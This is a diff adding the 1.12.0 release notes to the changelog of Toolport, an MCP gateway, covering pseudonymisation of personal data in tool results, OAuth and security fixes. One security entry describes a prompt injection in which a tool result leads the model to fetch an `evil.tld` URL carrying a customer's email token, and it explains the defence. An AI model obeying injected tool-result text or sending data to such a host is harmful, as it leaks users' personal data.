@@ -4,7 +4,7 @@ All notable changes to Toolport are documented here. Format loosely follows
 [Keep a Changelog](https://keepachangelog.com/); versions match the GitHub releases.
 Entries before the rename below shipped under the project's former name, Conduit.
 
-## [Unreleased]
+## [1.12.0] - 2026-08-09
 
 ### Added
 
@@ -51,6 +51,31 @@ Entries before the rename below shipped under the project's former name, Conduit
   as before. Because this skips the install step, a server stays on the version
   already in the npm cache instead of quietly picking up a newer release; set
   `TOOLPORT_NO_DIRECT_SPAWN=1` to restore the old behavior. (SOU-550)
+- Tool results can now have personal data replaced with pseudonyms before the model
+  sees them. Emails, phone numbers, card numbers, IBANs, IP addresses and
+  provider-shaped API keys become stable tokens (`⟦EMAIL_1⟧`) on the way in, and the
+  real values are put back on the way out to the server that provided them. The
+  mapping lives in memory only and never reaches disk or the model. Off by default.
+  This reduces what reaches the model rather than guaranteeing anything: a value no
+  detector recognizes still passes through, and so does everything once the per-session
+  cap is reached. (SBS-346)
+- Headless MCP servers can now authenticate with OAuth client credentials, so a
+  server that no one can click through a browser sign-in for still gets a real token.
+  Toolport discovers the endpoint, negotiates the client authentication method, and
+  reacquires before expiry. It never falls back to the interactive browser flow, which
+  would be unusable in the environment this exists for. (SBS-524)
+- Toolport now has keyboard shortcuts. `Ctrl/Cmd+1`–`6` switch view, `/` or
+  `Ctrl/Cmd+F` focuses the server search, `Ctrl/Cmd+N` adds a server, `Ctrl/Cmd+R`
+  refreshes, and `?` shows the full list. Previously every interaction was mouse-only
+  and the search box could not be focused from the keyboard at all. (SBS-143)
+- The window now reopens at the size and position you left it. It previously reset to
+  a fixed centered geometry on every quit, reboot and update relaunch. (SBS-144)
+- A code-mode script can now be validated without running it, and a script that fails
+  partway now reports the calls it already made instead of discarding them. A script
+  that dies on call 40 of 64 used to say nothing about the 39 whose side effects had
+  already committed. (SBS-646, SBS-647)
+- The gateway binary now supports `--help` and `--version` and rejects unknown flags
+  instead of silently ignoring them.
 
 ### Security
 
@@ -74,6 +99,35 @@ Entries before the rename below shipped under the project's former name, Conduit
 - OAuth authorization servers that advertise Client ID Metadata Document support
   now use Toolport's stable HTTPS client identity instead of Dynamic Client
   Registration. DCR remains the compatibility fallback for older servers. (SOU-451)
+- A pseudonym is now only ever resolved back for the server that produced that value.
+  Tool results are attacker-controlled, so a result from one server could otherwise
+  talk the model into putting another server's token in an argument — asking it to
+  fetch `https://evil.tld/?e=⟦EMAIL_1⟧` would have sent a real customer address to
+  whoever wrote the injected text. A call carrying a token from a different server is
+  now refused rather than sent. The practical cost is deliberate: reading a record
+  from one server and passing it to another no longer works unattended. (SBS-605)
+- The pseudonym map is now cleared when a conversation ends and on a fresh handshake,
+  on every transport. It previously lived for the whole gateway process with no
+  eviction, so a new conversation still resolved the previous one's tokens and real
+  values stayed resident indefinitely. (SBS-605)
+- Retry fields on a resumed request now get the same pseudonym handling as the
+  arguments beside them, so a host that answers a server's prompt from model context
+  no longer relays a literal token to the real server. (SBS-606)
+- OAuth token refresh is now serialized across the app and the gateway. They are
+  separate processes sharing one keychain, so both could read the same refresh token
+  and spend it twice — which a provider with refresh-token reuse detection answers by
+  revoking the whole family. The process that loses the race now uses the winner's
+  token instead of minting another. (SBS-479)
+- A refusal to send a saved token over cleartext no longer echoes credentials embedded
+  in the URL back into the error, where they reached the activity view and logs.
+  (SBS-636)
+- An empty tool-quarantine store now fails closed instead of being read as "nothing
+  quarantined". A truncated file silently re-exposed every tool held after high-risk
+  drift or baseline tamper. (SBS-654)
+- Rate-limit counters are now safe across concurrent gateway processes. Each client
+  spawns its own gateway, and they overwrote one another's counts, so org caps
+  under-counted and did not hold. Overlapping caps sharing a window also no longer
+  double-count a single call. (SBS-680, SBS-609)
 
 ### Fixed
 
@@ -84,6 +138,76 @@ Entries before the rename below shipped under the project's former name, Conduit
   The watcher now drops a read that a newer save has already superseded. (SOU-329)
 - OAuth loopback callbacks now reject an empty authorization code instead of showing
   a success page and sending an invalid token-exchange request.
+- Reading a resource whose URI contains non-ASCII characters no longer fails. The
+  template matcher walked the URI by byte, so backtracking through a multi-byte
+  character crashed the router and the read came back as an internal error even
+  though the URI was a valid expansion of the template. (SBS-620)
+- A code-mode script's return value is no longer silently corrupted. A `Date` came
+  back as `{}` and a `BigInt` as `null`, both reported as success, so an agent
+  continued on empty timestamps and null ids with no indication anything was lost.
+  Values that cannot be represented now fail with an error instead. (SBS-631)
+- Connecting, rescoping, disconnecting or migrating a client now leaves a reminder in
+  the panel, not just a toast that fades. The client keeps running its old config
+  until it restarts, so the change looked applied when it was not. Disconnect gets its
+  own wording, and migrating says it at all for the first time. (SBS-336)
+- The Activity list no longer comes up short when the audit log contains an unreadable
+  line. A corrupt row consumed a slot in the page instead of being skipped, hiding
+  valid history that should have filled it. (SBS-677)
+- Importing or pasting a server launched through `npx.bat` now keeps its package
+  identity. Only `.exe`, `.cmd` and `.ps1` were recognized as package runners, so two
+  servers running different packages under one display name collapsed into a single
+  import and a pasted config was named "npx". (SBS-664)
+- Toolport for Teams links now come from one place, and the onboarding "What is
+  Toolport for Teams?" link deliberately points at the explainer page rather than the
+  app sign-in. (SBS-461)
+
+### Changed
+
+- The team-instructions receipt hash now uses SHA-256 instead of Rust's default
+  hasher, whose algorithm carries no guarantee across compiler releases. **This
+  changes every member's reported hash once.** The Teams coverage dashboard will show
+  one round of drift that is not real drift; it reconverges as members report in on
+  this version. The hash is the same width and format as before. (SBS-460)
+
+### Maintenance
+
+- `cargo clippy --all-targets` is now free of errors. A single deny-by-default
+  `never_loop` in the resource-subscribe path was the last hard failure standing
+  between the repo and a blocking clippy gate in CI. (SBS-434)
+- Code mode's real limits are now documented and pinned by tests. A script that never
+  calls a tool and never awaits is bounded by iteration and recursion counts, not by
+  the wall clock, which nothing consults on that path. Both bounds fail closed, so a
+  runaway always terminates. (SBS-430)
+- Regression tests now pin that pseudonyms are resolved as the last step before a call
+  leaves the machine. That ordering had regressed once before without any test
+  noticing. (SBS-614)
+- CodeRev now reviews pull requests as an advisory shadow reviewer, once per PR.
+- Client configs written by Toolport keep their JSONC comments, and all text files
+  check out with LF endings on every platform.
+
+### Thanks
+
+Patches this cycle came from:
+
+- **[alexgaribay](https://github.com/alexgaribay)** - Kimi CLI support and a fix for
+  duplicate Tauri context creation across startup paths (#658, #662).
+- **[slegarraga](https://github.com/slegarraga)** - dead data-dir shim removal and
+  CONTRIBUTING accuracy fixes (#638, #639, #642).
+- **[Vermitrude](https://github.com/Vermitrude)** - Factory Droid CLI support and
+  gateway `--help`/`--version` handling (#369, #627).
+- **[rohankumardubey](https://github.com/rohankumardubey)** - headless security smoke
+  suite in CI and sidebar accessibility state (#580, #609).
+- **[syf2211](https://github.com/syf2211)** - readable connection-failure headlines
+  and catalog search that includes categories (#611, #614).
+- **[adity982](https://github.com/adity982)** - Crush MCP client support (#407).
+- **[arimu1](https://github.com/arimu1)** - JSONC comment preservation when writing
+  client configs (#592).
+- **[georgeatparallel](https://github.com/georgeatparallel)** - Parallel Search in the
+  curated catalog (#615).
+- **[aryansk](https://github.com/aryansk)** - documented the gateway's public
+  environment overrides (#640).
+- **[AshSgDe29071999](https://github.com/AshSgDe29071999)** - curated stacks
+  documentation and a less brittle stack test (#616).
 
 ## [1.11.0] - 2026-08-01
 
